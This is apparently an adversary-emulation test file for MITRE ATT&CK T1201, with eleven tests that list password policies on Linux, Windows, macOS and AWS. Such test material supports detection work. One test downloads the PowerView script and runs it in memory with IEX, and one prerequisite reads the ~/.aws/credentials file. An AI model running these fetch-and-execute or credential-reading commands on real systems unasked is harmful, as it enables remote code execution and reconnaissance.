attack_technique: T1201
display_name: Password Policy Discovery
atomic_tests:
    - name: Examine password complexity policy - Ubuntu
      item_id: T1201-1
      auto_generated_guid: 085fe567-ac84-47c7-ac4c-2688ce28265b
      description: |
        Lists the password complexity policy to console on Ubuntu Linux.
      supported_platforms:
        - linux
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            cat /etc/pam.d/common-password
        cleanup_command: ""
        name: bash
        elevation_required: false
    - name: Examine password complexity policy - CentOS/RHEL 7.x
      item_id: T1201-2
      auto_generated_guid: 78a12e65-efff-4617-bc01-88f17d71315d
      description: |
        Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
      supported_platforms:
        - linux
      input_arguments: {}
      dependency_executor_name: ""
      dependencies:
        - description: |
            System must be CentOS or RHEL v7
          prereq_command: |
            if [ $(uname -a | grep -ioP 'el[0-9]' | grep -oP '[0-9]') -eq "7" ]; then exit 0; else exit 1; fi;
          get_prereq_command: |
            echo Please run from CentOS or RHEL v7
      executor:
        command: |
            cat /etc/security/pwquality.conf
        cleanup_command: ""
        name: bash
        elevation_required: false
    - name: Examine password complexity policy - CentOS/RHEL 6.x
      item_id: T1201-3
      auto_generated_guid: 6ce12552-0adb-4f56-89ff-95ce268f6358
      description: |
        Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.
      supported_platforms:
        - linux
      input_arguments: {}
      dependency_executor_name: ""
      dependencies:
        - description: |
            System must be CentOS or RHEL v6
          prereq_command: |
            if [ $(rpm -q --queryformat '%{VERSION}') -eq "6" ]; then exit /b 0; else exit /b 1; fi;
          get_prereq_command: |
            echo Please run from CentOS or RHEL v6
      executor:
        command: |
            cat /etc/pam.d/system-auth
            cat /etc/security/pwquality.conf
        cleanup_command: ""
        name: bash
        elevation_required: false
    - name: Examine password expiration policy - All Linux
      item_id: T1201-4
      auto_generated_guid: 7c86c55c-70fa-4a05-83c9-3aa19b145d1a
      description: |
        Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.
      supported_platforms:
        - linux
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            cat /etc/login.defs
        cleanup_command: ""
        name: bash
        elevation_required: false
    - name: Examine local password policy - Windows
      item_id: T1201-5
      auto_generated_guid: 4588d243-f24e-4549-b2e3-e627acc089f6
      description: |
        Lists the local password policy to console on Windows.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            net accounts
        cleanup_command: ""
        name: command_prompt
        elevation_required: false
    - name: Examine domain password policy - Windows
      item_id: T1201-6
      auto_generated_guid: 46c2c362-2679-4ef5-aec9-0e958e135be4
      description: |
        Lists the domain password policy to console on Windows.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            net accounts /domain
        cleanup_command: ""
        name: command_prompt
        elevation_required: false
    - name: Examine password policy - macOS
      item_id: T1201-7
      auto_generated_guid: 4b7fa042-9482-45e1-b348-4b756b2a0742
      description: |
        Lists the password policy to console on macOS.
      supported_platforms:
        - macos
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: pwpolicy getaccountpolicies
        cleanup_command: ""
        name: bash
        elevation_required: false
    - name: Get-DomainPolicy with PowerView
      item_id: T1201-8
      auto_generated_guid: 3177f4da-3d4b-4592-8bdc-aa23d0b2e843
      description: |
        Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy
      item_id: T1201-9
      auto_generated_guid: b2698b33-984c-4a1c-93bb-e4ba72a0babb
      description: |
        The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.
        Upon successful execution a listing of the policy implemented will display.
        Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            get-addefaultdomainpasswordpolicy
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: Use of SecEdit.exe to export the local security policy (including the password policy)
      item_id: T1201-10
      auto_generated_guid: 510cc97f-56ac-4cd3-a198-d3218c23d889
      description: |
        SecEdit.exe can be used to export the current local security policy applied to a host.
        [Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt
        cleanup_command: ""
        name: command_prompt
        elevation_required: true
    - name: Examine AWS Password Policy
      item_id: T1201-11
      auto_generated_guid: 15330820-d405-450b-bd08-16b5be5be9f4
      description: |
        This atomic test will display details about the password policy for the current AWS account.
      supported_platforms:
        - iaas:aws
      input_arguments: {}
      dependency_executor_name: ""
      dependencies:
        - description: |
            Check if ~/.aws/credentials file has a default stanza is configured
          prereq_command: |
            cat ~/.aws/credentials | grep "default"
          get_prereq_command: |
            echo Please install the aws-cli and configure your AWS defult profile using: aws configure
      executor:
        command: |
            aws iam get-account-password-policy
        cleanup_command: ""
        name: sh
        elevation_required: false
